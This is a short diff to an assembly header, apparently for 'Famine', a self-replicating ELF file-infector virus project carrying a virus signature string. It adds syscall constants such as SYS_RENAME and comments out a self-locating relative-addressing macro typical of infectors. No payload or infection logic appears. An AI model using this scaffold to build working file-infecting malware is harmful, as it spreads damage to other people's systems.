@@ -8,6 +8,7 @@
 %define FILE_SIZE 256
 %define DIRENT 1024
 %define FSTAT 144
+%define ENTRY 16
 %define MAPPED_FILE 8
 
 
@@ -31,18 +32,19 @@
 %define SYS_FSTAT 5
 %define SYS_MUNMAP 11
 %define SYS_EXIT 60
+%define SYS_RENAME 82
 %define SYS_GETDENTS 217
 
 %define SIGNATURE "Famine version 1.0 (c)oded by dbaffier"
 
 %define printf xprintf
 
-%macro rel_init 0
-    call rel_hook
-    rel_hook: pop r12
-%endmacro
+; %macro rel_init 0
+    ; call rel_hook
+    ; rel_hook: pop r12
+; %endmacro
 
-%define rel(offset) r12 + offset - rel_hook
+; %define rel(offset) r12 + offset - rel_hook
 
 %macro dbg 2
     lea rdi, %1
